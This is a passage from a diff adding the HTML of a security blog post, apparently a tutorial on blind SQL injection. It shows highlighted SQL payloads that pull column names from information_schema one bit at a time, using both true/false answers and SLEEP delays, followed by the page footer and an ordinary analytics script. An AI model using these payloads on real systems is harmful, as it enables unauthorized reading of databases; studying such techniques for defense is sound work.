+      <span class="n">SUBSTR</span><span class="p">(</span>
+        <span class="p">(</span>
+          <span class="k">SELECT</span>
+          <span class="k">DISTINCT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
+          <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'games'</span>
+          <span class="k">LIMIT</span> <span class="mi">1</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="c1">-- First result</span>
+        <span class="p">),</span>
+        <span class="mi">1</span><span class="p">,</span> <span class="c1">-- First character</span>
+        <span class="mi">1</span>
+      <span class="p">)</span>
+    <span class="p">)</span>
+  <span class="p">)</span><span class="o">&amp;</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span> <span class="k">THEN</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">);</span>
+
+<span class="c1">-- Extract bits 3 &amp; 4 of the first character of the first result</span>
+<span class="k">SELECT</span> <span class="p">(</span>
+  <span class="c1">-- Extract 3rd bit through true/false result</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="n">INSTR</span><span class="p">(</span>
+      <span class="s1">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="p">,</span>
+      <span class="n">SUBSTR</span><span class="p">(</span>
+        <span class="p">(</span>
+          <span class="k">SELECT</span>
+          <span class="k">DISTINCT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
+          <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'games'</span>
+          <span class="k">LIMIT</span> <span class="mi">1</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="c1">-- First result</span>
+        <span class="p">),</span>
+        <span class="mi">1</span><span class="p">,</span> <span class="c1">-- First character</span>
+        <span class="mi">1</span>
+      <span class="p">)</span>
+    <span class="p">)</span>
+  <span class="p">)</span><span class="o">&amp;</span><span class="mi">4</span><span class="o">=</span><span class="mi">4</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">)</span> <span class="o">+</span> <span class="p">(</span>
+  <span class="c1">-- Extract 4th bit through temporal result</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="n">INSTR</span><span class="p">(</span>
+      <span class="s1">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="p">,</span>
+      <span class="n">SUBSTR</span><span class="p">(</span>
+        <span class="p">(</span>
+          <span class="k">SELECT</span>
+          <span class="k">DISTINCT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
+          <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'games'</span>
+          <span class="k">LIMIT</span> <span class="mi">1</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="c1">-- First result</span>
+        <span class="p">),</span>
+        <span class="mi">1</span><span class="p">,</span> <span class="c1">-- First character</span>
+        <span class="mi">1</span>
+      <span class="p">)</span>
+    <span class="p">)</span>
+  <span class="p">)</span><span class="o">&amp;</span><span class="mi">8</span><span class="o">=</span><span class="mi">8</span> <span class="k">THEN</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">);</span>
+
+<span class="p">...</span>
+
+<span class="c1">-- Extract bits 5 &amp; 6 of the seventh character of the third result</span>
+<span class="k">SELECT</span> <span class="p">(</span>
+  <span class="c1">-- Extract 5th bit through true/false result</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="n">INSTR</span><span class="p">(</span>
+      <span class="s1">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="p">,</span>
+      <span class="n">SUBSTR</span><span class="p">(</span>
+        <span class="p">(</span>
+          <span class="k">SELECT</span>
+          <span class="k">DISTINCT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
+          <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'games'</span>
+          <span class="k">LIMIT</span> <span class="mi">1</span> <span class="k">OFFSET</span> <span class="mi">2</span> <span class="c1">-- Third result</span>
+        <span class="p">),</span>
+        <span class="mi">7</span><span class="p">,</span> <span class="c1">-- Seventh character</span>
+        <span class="mi">1</span>
+      <span class="p">)</span>
+    <span class="p">)</span>
+  <span class="p">)</span><span class="o">&amp;</span><span class="mi">16</span><span class="o">=</span><span class="mi">16</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">)</span> <span class="o">+</span> <span class="p">(</span>
+  <span class="c1">-- Extract 6th bit through temporal result</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="n">INSTR</span><span class="p">(</span>
+      <span class="s1">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="p">,</span>
+      <span class="c1">-- Select seventh character</span>
+      <span class="n">SUBSTR</span><span class="p">(</span>
+        <span class="p">(</span>
+          <span class="k">SELECT</span>
+          <span class="k">DISTINCT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
+          <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'games'</span>
+          <span class="k">LIMIT</span> <span class="mi">1</span> <span class="k">OFFSET</span> <span class="mi">2</span> <span class="c1">-- Third result</span>
+        <span class="p">),</span>
+        <span class="mi">7</span><span class="p">,</span> <span class="c1">-- Seventh character</span>
+        <span class="mi">1</span>
+      <span class="p">)</span>
+    <span class="p">)</span>
+  <span class="p">)</span><span class="o">&amp;</span><span class="mi">32</span><span class="o">=</span><span class="mi">32</span> <span class="k">THEN</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+  </div>
+
+  <div class="postfooter">
+    <a href="/">Home</a>
+    
+      <a href="/security/index.html">More Security posts</a>
+    
+  </div>
+</article>
+
+
+
+
+<script>
+
+async function calculateClientId() {
+  /*
+  Calculate a semi-unique client Id which rotates every 4 hours. Client Id is
+  calculated from the browser user-agent, language and timezone only. This is
+  meant to be enough to track a browser across pages for a period of time, but
+  othing more. The client Id is is non-persistent and re-calculated each page
+  load, it is not stored in a cookie or local storage.
+  */
+  const identifier = [
+    new Date() - new Date() % (4 * 60 * 60 * 1000), // TrackingID is keyed to the time
+    navigator.userAgent,                            // User agent
+    navigator.language,                             // Browser language, e.g. "en-US"
+    new Date().getTimezoneOffset()                  // Timezone offset
+  ];
+
+  // Hash the identifier, discard a potion of the hash and coerce into the correct format
+  const msgUint8 = new TextEncoder().encode(identifier.join(","));
+  const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(-32);
+  return `${hashHex.slice(0, 8)}-${hashHex.slice(8, 12)}-${hashHex.slice(12, 16)}-${hashHex.slice(16, 20)}-${hashHex.slice(20, 32)}`;
+}
+
+(function() {
+  // Only perform analytics on browsers which have not enabled doNotTrack
+  if (navigator.doNotTrack != 1) {
+    /*
+    References:
+      https://developers.google.com/analytics/devguides/collection/protocol/v1/reference
+      https://developers.google.com/analytics/devguides/collection/analyticsjs/cookies-user-id#disabling_cookies
+      https://developers.google.com/analytics/devguides/collection/analyticsjs/ip-anonymization
+    */
+
+    var promises = [];
+    
+    calculateClientId().then((clientId) => {
+      const stat_vars = {
+        v:  1,                    // Version
+        
+        cid: clientId,            // Client Id
+        t: 'pageview',            // Hit type
+        aip: 1,                   // Set anonymizeIp to mask IP addresses
+        dl: window.location.href, // Document location
+        dt: document.title,       // Document title
+        dr: document.referrer,    // Document referrer
+        z: Date.now()             // Cache buster
+      };
+      const url = 'https://logs-01.loggly.com/inputs/c77487f5-9e26-4c31-bb3e-feb5c17a00e6/tag/loggly-jslogger';
+
+      
+      promises.push(fetch(url, {
+        credentials: 'omit',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'text/plain'
+        },
+        body: JSON.stringify(stat_vars)
+      }));
+      
+    });
+    
+    calculateClientId().then((clientId) => {
+      const stat_vars = {
+        v:  1,                    // Version
+        tid: 'UA-157572028-1', // Endpoint Id
+        cid: clientId,            // Client Id
+        t: 'pageview',            // Hit type
+        aip: 1,                   // Set anonymizeIp to mask IP addresses
+        dl: window.location.href, // Document location
+        dt: document.title,       // Document title
+        dr: document.referrer,    // Document referrer
+        z: Date.now()             // Cache buster
+      };
+      const url = 'https://www.google-analytics.com/collect';
+
+      
+      let uri_vars = [];
+      for (var_key in stat_vars) {
+        uri_vars.push(`${var_key}=${encodeURIComponent(stat_vars[var_key])}`);
+      }
+
+      promises.push(fetch(`${url}?${uri_vars.join('&')}`, {
+        credentials: 'omit'
+      }));
+      
+    });
+    
+
+    
+    
+  }
+})();
+
+
+</script>
+
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
